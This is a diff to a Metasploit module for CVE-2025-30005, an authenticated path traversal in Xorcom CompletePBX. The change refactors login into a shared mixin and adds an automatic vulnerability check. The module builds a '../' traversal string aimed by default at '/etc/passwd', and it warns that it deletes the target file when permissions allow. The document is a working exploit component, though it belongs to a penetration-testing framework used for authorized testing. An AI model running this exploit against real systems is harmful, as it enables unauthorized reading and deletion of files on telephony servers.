@@ -5,6 +5,8 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::XorcomCompletePBX
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -22,7 +24,9 @@ class MetasploitModule < Msf::Auxiliary
 
           The vulnerability is identified as CVE-2025-30005.
         },
-        'Author' => ['Valentin Lobstein'],
+        'Author' => [
+          'Valentin Lobstein' # Research and module development
+        ],
         'License' => MSF_LICENSE,
         'References' => [
           ['CVE', '2025-30005'],
@@ -40,9 +44,8 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, 'Base path of the CompletePBX instance', '/']),
         OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
-        OptString.new('PASSWORD', [true, 'Password for authentication' ]),
+        OptString.new('PASSWORD', [true, 'Password for authentication']),
         OptString.new('TARGETFILE', [true, 'File to retrieve from the system', '/etc/passwd'])
       ]
     )
@@ -53,35 +56,8 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def login
-    print_status("Attempting authentication with username: #{datastore['USERNAME']}")
-
-    res = send_request_cgi({
-      'uri' => normalize_uri(datastore['TARGETURI'], 'login'),
-      'method' => 'POST',
-      'ctype' => 'application/x-www-form-urlencoded',
-      'vars_post' => {
-        'userid' => datastore['USERNAME'],
-        'userpass' => datastore['PASSWORD']
-      }
-    })
-
-    unless res
-      fail_with(Failure::Unreachable, 'No response from target')
-    end
-
-    unless res.code == 200
-      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
-    end
-
-    sid_cookie = res.get_cookies.scan(/sid=[a-f0-9]+/).first
-
-    unless sid_cookie
-      fail_with(Failure::NoAccess, 'Authentication failed: No session ID received')
-    end
-
-    print_good("Authentication successful! Session ID: #{sid_cookie}")
-    return sid_cookie
+  def check
+    is_completepbx
   end
 
   def run
@@ -101,8 +77,8 @@ class MetasploitModule < Msf::Auxiliary
     print_warning('This exploit WILL delete the target file if permissions allow.')
     sleep(2)
 
-    sid_cookie = login
-    target_file = "../../../../../../../../../../..#{datastore['TARGETFILE']}"
+    sid_cookie = completepbx_login
+    target_file = "../../../../../../../../../../../#{datastore['TARGETFILE']}"
 
     print_status("Attempting to read file: #{target_file}")
 
